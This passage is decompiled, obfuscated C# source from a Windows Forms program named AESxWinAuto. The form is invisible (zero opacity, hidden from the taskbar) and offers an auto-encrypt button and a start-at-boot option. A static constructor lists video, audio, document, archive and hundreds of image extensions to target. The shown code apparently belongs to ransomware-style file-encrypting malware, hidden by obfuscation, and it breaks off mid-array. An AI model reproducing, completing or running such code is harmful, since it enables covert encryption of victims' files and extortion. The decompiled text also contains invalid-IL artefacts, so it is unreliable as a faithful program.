		if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			num = 4;
		}
		else
		{
			num = 1;
			if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				goto IL_007e;
			}
		}
		goto IL_003b;
		IL_003b:
		int num2 = num;
		goto IL_003f;
		IL_003f:
		while (true)
		{
			switch (num2)
			{
			case 5:
				break;
			case 2:
				goto IL_007e;
			default:
				goto IL_00a0;
			case 0:
			case 4:
				if (disposing)
				{
					num2 = 2;
					continue;
				}
				goto IL_00a0;
			case 6:
				return;
			}
			break;
		}
		goto IL_0021;
		IL_007e:
		if (components != null)
		{
			num2 = 5;
			goto IL_003f;
		}
		goto IL_00a0;
		IL_0021:
		components.Dispose();
		goto IL_00a0;
		IL_00a0:
		((Form)this).Dispose(disposing);
		num = 6;
		if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			goto IL_0021;
		}
		goto IL_003b;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitializeComponent()
	{
		//Discarded unreachable code: IL_0005, IL_0a2e
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Expected O, but got Unknown
		//IL_025d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0267: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_043a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0455: Unknown result type (might be due to invalid IL or missing references)
		//IL_045f: Expected O, but got Unknown
		//IL_04a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04aa: Expected O, but got Unknown
		//IL_0518: Unknown result type (might be due to invalid IL or missing references)
		//IL_0522: Expected O, but got Unknown
		//IL_0536: Unknown result type (might be due to invalid IL or missing references)
		//IL_0540: Expected O, but got Unknown
		//IL_05ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0609: Expected O, but got Unknown
		//IL_06c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06cb: Expected O, but got Unknown
		//IL_06f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ff: Expected O, but got Unknown
		//IL_0840: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccd: Expected O, but got Unknown
		//IL_0d0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d18: Expected O, but got Unknown
		//IL_0d67: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d71: Expected O, but got Unknown
		//IL_0f39: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f43: Expected O, but got Unknown
		//IL_0f92: Unknown result type (might be due to invalid IL or missing references)
		//IL_104c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1056: Expected O, but got Unknown
		//IL_10b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_10bb: Expected O, but got Unknown
		//IL_110a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1114: Expected O, but got Unknown
		//IL_13bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_13c7: Expected O, but got Unknown
		int num = 98;
		ComponentResourceManager componentResourceManager = default(ComponentResourceManager);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3;
				switch (num2)
				{
				case 121:
					((Control)this).SuspendLayout();
					num3 = 51;
					goto IL_0a33;
				case 128:
					((Control)btnStartAutoEncrypt).set_Enabled(false);
					num3 = 45;
					goto IL_0a33;
				case 40:
					((Control)comboBox3).set_Location(new Point(177, 40));
					num2 = 41;
					continue;
				case 43:
					((Control)this).ResumeLayout(false);
					num = 6;
					if (true)
					{
						break;
					}
					goto case 8;
				case 8:
					((Control)comboBox3).set_TabIndex(20);
					num = 81;
					break;
				case 131:
					((Control)button3).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(364));
					num = 92;
					if (0 == 0)
					{
						break;
					}
					goto case 129;
				case 129:
					((Control)checkBox1).set_Size(new Size(98, 21));
					num2 = 39;
					continue;
				case 60:
					((Form)this).set_MaximizeBox(false);
					num3 = 17;
					goto IL_0a33;
				case 49:
					((Form)this).set_StartPosition((FormStartPosition)1);
					num = 116;
					if (0 == 0)
					{
						break;
					}
					goto case 1;
				case 1:
					((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
					num = 26;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 84;
				case 84:
					((ButtonBase)button8).set_UseVisualStyleBackColor(true);
					num = 85;
					break;
				case 116:
					((Control)this).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(412));
					num3 = 43;
					goto IL_0a33;
				case 118:
					((Control)button10).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(392));
					num = 134;
					if (0 == 0)
					{
						break;
					}
					goto case 48;
				case 48:
					((Control)this).get_Controls().Add((Control)(object)button11);
					num = 12;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 88;
				case 88:
					((Control)this).get_Controls().Add((Control)(object)button3);
					num2 = 31;
					continue;
				case 141:
					((Control)this).get_Controls().Add((Control)(object)button10);
					num = 48;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 14;
				case 14:
					((Control)button9).set_Size(new Size(75, 23));
					num3 = 10;
					goto IL_0a33;
				case 11:
					webBrowser1 = new WebBrowser();
					num3 = 115;
					goto IL_0a33;
				case 52:
					((Control)button10).set_Location(new Point(108, 26));
					num2 = 118;
					continue;
				case 100:
					timer4.add_Tick((EventHandler)timer4_Tick);
					num2 = 32;
					continue;
				case 36:
					checkBox1 = new CheckBox();
					num = 7;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 134;
				case 134:
					((Control)button10).set_Size(new Size(75, 23));
					num3 = 28;
					goto IL_0a33;
				case 25:
					((Control)btnStartAutoEncrypt).add_Click((EventHandler)btnStartAutoEncrypt_Click);
					num = 46;
					break;
				case 145:
					checkBox1.add_CheckedChanged((EventHandler)checkBox1_CheckedChanged);
					_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num = 87;
						if (0 == 0)
						{
							break;
						}
						goto case 31;
					}
					num3 = 47;
					goto IL_0a33;
				case 31:
					((Control)this).get_Controls().Add((Control)(object)button1);
					num2 = 62;
					continue;
				case 146:
					((ButtonBase)chckIsStartup).set_UseVisualStyleBackColor(true);
					num = 120;
					if (true)
					{
						break;
					}
					goto case 7;
				case 7:
					button8 = new Button();
					num2 = 4;
					continue;
				case 16:
					((Control)this).get_Controls().Add((Control)(object)comboBox1);
					num = 144;
					if (0 == 0)
					{
						break;
					}
					goto case 137;
				case 137:
					((ButtonBase)button3).set_UseVisualStyleBackColor(true);
					num2 = 96;
					continue;
				case 86:
					((ButtonBase)btnStartAutoEncrypt).set_UseVisualStyleBackColor(true);
					num3 = 25;
					goto IL_0a33;
				case 59:
					((Control)chckIsStartup).set_AutoSize(true);
					num2 = 135;
					continue;
				case 89:
					((Control)button9).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(388));
					num3 = 74;
					goto IL_0a33;
				case 71:
					((ButtonBase)button1).set_UseVisualStyleBackColor(true);
					num3 = 93;
					goto IL_0a33;
				case 22:
					((Control)button1).set_Size(new Size(75, 23));
					num = 111;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 66;
				case 66:
					((Form)this).set_ShowInTaskbar(false);
					num2 = 49;
					continue;
				case 46:
					((Control)chckIsStartup).set_Anchor((AnchorStyles)10);
					num2 = 59;
					continue;
				case 107:
					((Control)chckIsStartup).set_Margin(new Padding(4));
					num3 = 30;
					goto IL_0a33;
				case 110:
					timer2 = new Timer(components);
					num = 67;
					break;
				case 144:
					((Control)this).get_Controls().Add((Control)(object)button8);
					num = 101;
					if (0 == 0)
					{
						break;
					}
					goto case 69;
				case 69:
					((Form)this).set_Icon((Icon)componentResourceManager.GetObject(S7EI44sMaZQ92MiG6X.pA2PN5iOW(408)));
					num = 68;
					if (true)
					{
						break;
					}
					goto case 29;
				case 29:
					((Control)button1).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(360));
					num2 = 71;
					continue;
				case 39:
					((Control)checkBox1).set_TabIndex(13);
					num2 = 140;
					continue;
				case 61:
					((Control)btnStartAutoEncrypt).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(208));
					num2 = 86;
					continue;
				case 5:
					timer1 = new Timer(components);
					num = 110;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 24;
				case 24:
					button10 = new Button();
					num2 = 2;
					continue;
				case 82:
					timer2.add_Tick((EventHandler)timer2_Tick);
					num2 = 65;
					continue;
				case 139:
					((Control)button3).set_TabIndex(7);
					num2 = 114;
					continue;
				case 23:
					((Control)button11).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(396));
					num = 95;
					break;
				case 115:
					timer4 = new Timer(components);
					num = 36;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 108;
				case 108:
					((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
					num3 = 145;
					goto IL_0a33;
				case 125:
					((Control)this).get_Controls().Add((Control)(object)button9);
					num3 = 141;
					goto IL_0a33;
				case 15:
					comboBox2 = new ComboBox();
					num3 = 11;
					goto IL_0a33;
				case 75:
					((Control)button12).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(400));
					num3 = 76;
					goto IL_0a33;
				case 58:
					((Control)this).get_Controls().Add((Control)(object)checkBox1);
					num3 = 54;
					goto IL_0a33;
				case 136:
					((Control)btnStartAutoEncrypt).set_Size(new Size(112, 28));
					num = 94;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 111;
				case 104:
					((Control)comboBox1).set_Size(new Size(121, 24));
					num = 123;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 0;
				case 105:
					((ButtonBase)button11).set_UseVisualStyleBackColor(true);
					num3 = 9;
					goto IL_0a33;
				case 126:
					chckIsStartup = new CheckBox();
					num3 = 5;
					goto IL_0a33;
				case 17:
					((Control)this).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(412));
					num = 117;
					break;
				case 4:
					comboBox3 = new ComboBox();
					num3 = 97;
					goto IL_0a33;
				case 62:
					((Control)this).get_Controls().Add((Control)(object)btnStartAutoEncrypt);
					num2 = 109;
					continue;
				case 47:
				case 80:
					((Control)button8).set_Size(new Size(75, 23));
					num3 = 19;
					goto IL_0a33;
				case 117:
					((Form)this).set_Opacity(0.0);
					num3 = 66;
					goto IL_0a33;
				case 20:
					((Control)button8).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(380));
					goto case 47;
				case 96:
					timer3.add_Tick((EventHandler)timer3_Tick);
					num = 113;
					if (0 == 0)
					{
						break;
					}
					goto case 142;
				case 142:
					timer4.set_Enabled(true);
					num = 143;
					if (0 == 0)
					{
						break;
					}
					goto case 114;
				case 114:
					((Control)button3).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(364));
					num3 = 137;
					goto IL_0a33;
				case 79:
					((Control)webBrowser1).set_Location(new Point(131, 12));
					num = 1;
					if (0 == 0)
					{
						break;
					}
					goto case 109;
				case 109:
					((Control)this).get_Controls().Add((Control)(object)chckIsStartup);
					num = 69;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 31;
				case 124:
					((Control)btnStartAutoEncrypt).set_Margin(new Padding(4));
					num = 13;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 38;
				case 38:
					((Control)webBrowser1).set_Size(new Size(250, 250));
					num = 42;
					if (0 == 0)
					{
						break;
					}
					goto case 101;
				case 101:
					((Control)this).get_Controls().Add((Control)(object)comboBox3);
					num2 = 125;
					continue;
				case 72:
					((Control)button8).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(380));
					num = 84;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 73;
				case 73:
					((Control)button11).set_TabIndex(17);
					num = 64;
					if (true)
					{
						break;
					}
					goto case 140;
				case 140:
					((Control)checkBox1).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(376));
					num = 108;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 132;
				case 28:
					((Control)button10).set_TabIndex(18);
					num = 21;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 85;
				case 85:
					((ListControl)comboBox3).set_FormattingEnabled(true);
					num = 40;
					break;
				case 26:
					((Control)webBrowser1).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(372));
					num = 38;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 118;
				case 13:
					((Control)btnStartAutoEncrypt).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(348));
					num = 136;
					if (0 == 0)
					{
						break;
					}
					goto case 81;
				case 81:
					((Control)button9).set_Location(new Point(207, 47));
					num2 = 70;
					continue;
				case 138:
					((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
					num = 50;
					if (0 == 0)
					{
						break;
					}
					goto case 42;
				case 42:
					((Control)webBrowser1).set_TabIndex(11);
					num = 142;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 13;
				case 3:
					((Control)checkBox1).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(376));
					goto case 129;
				default:
					num = 129;
					break;
				case 92:
					((Control)button3).set_Size(new Size(75, 23));
					num = 139;
					if (0 == 0)
					{
						break;
					}
					goto case 53;
				case 53:
					button12 = new Button();
					num2 = 99;
					continue;
				case 44:
					((Control)comboBox3).set_Size(new Size(121, 24));
					num3 = 8;
					goto IL_0a33;
				case 111:
					((Control)button1).set_TabIndex(5);
					num2 = 29;
					continue;
				case 97:
					button9 = new Button();
					num3 = 24;
					goto IL_0a33;
				case 0:
					((Control)button12).set_Size(new Size(75, 23));
					num3 = 127;
					goto IL_0a33;
				case 56:
					((Control)comboBox2).set_Size(new Size(121, 24));
					num3 = 130;
					goto IL_0a33;
				case 103:
					timer3 = new Timer(components);
					num3 = 15;
					goto IL_0a33;
				case 57:
					((Form)this).set_ClientSize(new Size(664, 148));
					num2 = 16;
					continue;
				case 91:
					((Control)checkBox1).set_Location(new Point(478, 98));
					num2 = 3;
					continue;
				case 106:
					((Control)button1).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(360));
					num = 22;
					break;
				case 76:
					((ButtonBase)button12).set_UseVisualStyleBackColor(true);
					num2 = 34;
					continue;
				case 50:
					((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
					num = 57;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 65;
				case 65:
					((Control)button1).set_Location(new Point(225, 72));
					num = 106;
					if (0 == 0)
					{
						break;
					}
					goto case 21;
				case 21:
					((Control)button10).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(392));
					num = 83;
					break;
				case 34:
					((ListControl)comboBox1).set_FormattingEnabled(true);
					num = 35;
					if (true)
					{
						break;
					}
					goto case 130;
				case 130:
					((Control)comboBox2).set_TabIndex(10);
					num = 79;
					if (0 == 0)
					{
						break;
					}
					goto case 127;
				case 127:
					((Control)button12).set_TabIndex(16);
					num2 = 75;
					continue;
				case 74:
					((ButtonBase)button9).set_UseVisualStyleBackColor(true);
					num2 = 52;
					continue;
				case 93:
					((Control)button3).set_Location(new Point(191, 28));
					num = 131;
					if (true)
					{
						break;
					}
					goto case 27;
				case 27:
					((Control)chckIsStartup).set_Size(new Size(213, 21));
					num = 33;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 41;
				case 41:
					((Control)comboBox3).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(384));
					num3 = 44;
					goto IL_0a33;
				case 18:
					button3 = new Button();
					num2 = 103;
					continue;
				case 63:
					((Control)button11).set_Location(new Point(223, 57));
					num = 23;
					break;
				case 51:
					((Control)btnStartAutoEncrypt).set_Anchor((AnchorStyles)10);
					num = 128;
					break;
				case 68:
					((Form)this).set_Margin(new Padding(4));
					num = 60;
					if (0 == 0)
					{
						break;
					}
					goto case 122;
				case 122:
					((Control)comboBox1).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(404));
					num = 104;
					if (0 == 0)
					{
						break;
					}
					goto case 54;
				case 54:
					((Control)this).get_Controls().Add((Control)(object)webBrowser1);
					num2 = 133;
					continue;
				case 119:
					((Control)chckIsStartup).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(356));
					num2 = 146;
					continue;
				case 95:
					((Control)button11).set_Size(new Size(75, 23));
					num2 = 73;
					continue;
				case 133:
					((Control)this).get_Controls().Add((Control)(object)comboBox2);
					num = 88;
					break;
				case 99:
					comboBox1 = new ComboBox();
					num2 = 121;
					continue;
				case 78:
				case 87:
					((Control)button8).set_Location(new Point(278, 154));
					num2 = 20;
					continue;
				case 45:
					((Control)btnStartAutoEncrypt).set_Location(new Point(539, 112));
					num = 124;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 2;
				case 2:
					button11 = new Button();
					num = 53;
					if (0 == 0)
					{
						break;
					}
					goto case 35;
				case 35:
					((Control)comboBox1).set_Location(new Point(35, 28));
					num = 122;
					if (0 == 0)
					{
						break;
					}
					goto case 143;
				case 143:
					timer4.set_Interval(105100);
					num3 = 100;
					goto IL_0a33;
				case 55:
					btnStartAutoEncrypt = new Button();
					num = 126;
					if (0 == 0)
					{
						break;
					}
					goto case 94;
				case 94:
					((Control)btnStartAutoEncrypt).set_TabIndex(4);
					num2 = 61;
					continue;
				case 12:
					((Control)this).get_Controls().Add((Control)(object)button12);
					num3 = 58;
					goto IL_0a33;
				case 6:
					((Control)this).PerformLayout();
					num = 147;
					break;
				case 30:
					((Control)chckIsStartup).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(352));
					num2 = 27;
					continue;
				case 135:
					((Control)chckIsStartup).set_Location(new Point(111, 71));
					num3 = 107;
					goto IL_0a33;
				case 70:
					((Control)button9).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(388));
					num3 = 14;
					goto IL_0a33;
				case 132:
					((Control)button12).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(400));
					num = 0;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 60;
				case 112:
					components = new Container();
					num3 = 90;
					goto IL_0a33;
				case 90:
					componentResourceManager = new ComponentResourceManager(Type.GetTypeFromHandle(cdDYJXxtRNHGdUNTh2.e53w34m968awCm9P85taUZe(33554439)));
					num = 55;
					break;
				case 37:
					((Control)comboBox2).set_Location(new Point(106, 27));
					num = 102;
					break;
				case 64:
					((Control)button11).set_Text(S7EI44sMaZQ92MiG6X.pA2PN5iOW(396));
					num3 = 105;
					goto IL_0a33;
				case 77:
					timer1.add_Tick((EventHandler)timer1_Tick);
					num = 82;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 123;
				case 123:
					((Control)comboBox1).set_TabIndex(22);
					num = 138;
					if (0 == 0)
					{
						break;
					}
					goto case 10;
				case 10:
					((Control)button9).set_TabIndex(19);
					num = 89;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 113;
				case 113:
					((ListControl)comboBox2).set_FormattingEnabled(true);
					num3 = 37;
					goto IL_0a33;
				case 98:
					if (S7EI44sMaZQ92MiG6X.EmWT1u1C4(80))
					{
						num3 = 112;
						goto IL_0a33;
					}
					return;
				case 102:
					((Control)comboBox2).set_Name(S7EI44sMaZQ92MiG6X.pA2PN5iOW(368));
					num2 = 56;
					continue;
				case 9:
					((Control)button12).set_Location(new Point(142, 70));
					num3 = 132;
					goto IL_0a33;
				case 32:
					((Control)checkBox1).set_AutoSize(true);
					num3 = 91;
					goto IL_0a33;
				case 19:
					((Control)button8).set_TabIndex(21);
					num3 = 72;
					goto IL_0a33;
				case 120:
					((Control)chckIsStartup).add_Click((EventHandler)chckIsStartup_Click);
					num2 = 77;
					continue;
				case 83:
					((ButtonBase)button10).set_UseVisualStyleBackColor(true);
					num = 63;
					if (0 == 0)
					{
						break;
					}
					goto case 67;
				case 67:
					button1 = new Button();
					num3 = 18;
					goto IL_0a33;
				case 33:
					((Control)chckIsStartup).set_TabIndex(1);
					num = 119;
					if (false)
					{
						return;
					}
					break;
				case 147:
					return;
					IL_0a33:
					num = num3;
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	static AESxWinAuto()
	{
		//Discarded unreachable code: IL_0005, IL_1996
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 1;
		int num;
		if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			num = 5;
			if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				goto IL_199f;
			}
			return;
		}
		int num2 = 7;
		goto IL_19a3;
		IL_19a3:
		while (true)
		{
			int num3;
			switch (num2)
			{
			case 3:
				return;
			case 1:
				goto IL_18ad;
			case 6:
				audio_ext = new string[6]
				{
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1960),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1460),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1964),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(468),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1968),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1464)
				};
				goto case 4;
			default:
				num3 = 4;
				goto IL_199b;
			case 2:
			case 7:
				video_ext = new string[15]
				{
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1272),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1324),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1384),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1388),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1392),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1424),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1948),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1952),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1448),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1456),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1468),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1232),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1236),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1256),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1956)
				};
				num = 6;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto IL_18ad;
				}
				break;
			case 4:
				document_ext = new string[9]
				{
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1168),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1972),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1200),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1144),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1148),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1180),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(964),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1208),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1212)
				};
				num3 = 8;
				goto IL_199b;
			case 8:
				compressed_ext = new string[5]
				{
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1220),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1196),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1240),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1976),
					S7EI44sMaZQ92MiG6X.pA2PN5iOW(1980)
				};
				num3 = 1;
				goto IL_199b;
			case 0:
			case 5:
				if (!S7EI44sMaZQ92MiG6X.EmWT1u1C4(84))
				{
					image_ext = new string[390]
					{
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(416),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(420),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(424),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(428),
						S7EI44sMaZQ92MiG6X.pA2PN5iOW(432),
